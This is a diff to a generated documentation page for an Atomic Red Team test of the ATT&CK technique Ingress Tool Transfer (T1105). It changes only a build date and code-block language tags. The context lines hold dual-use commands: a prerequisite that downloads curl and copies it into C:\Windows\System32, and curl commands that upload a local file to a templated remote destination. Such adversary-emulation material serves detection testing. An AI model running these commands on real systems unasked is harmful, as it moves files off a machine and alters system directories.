@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1105"
 attack_technique_name: "Ingress Tool Transfer"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "635c9a38-6cbf-47dc-8615-3810bc1167cf"
@@ -64,13 +64,13 @@ Curl must be installed on system.
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path #{curl_path}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
 Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
 Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
@@ -82,13 +82,13 @@ A file must be created to upload
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path #{file_path}) {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 echo "This is an Atomic Test File" > #{file_path}
 ```
 
@@ -98,7 +98,7 @@ echo "This is an Atomic Test File" > #{file_path}
 
 ### Command
 
-```commandprompt
+```cmd
 #{curl_path} -T #{file_path} #{remote_destination}
 #{curl_path} --upload-file #{file_path} #{remote_destination}
 #{curl_path} -d #{file_path} #{remote_destination}
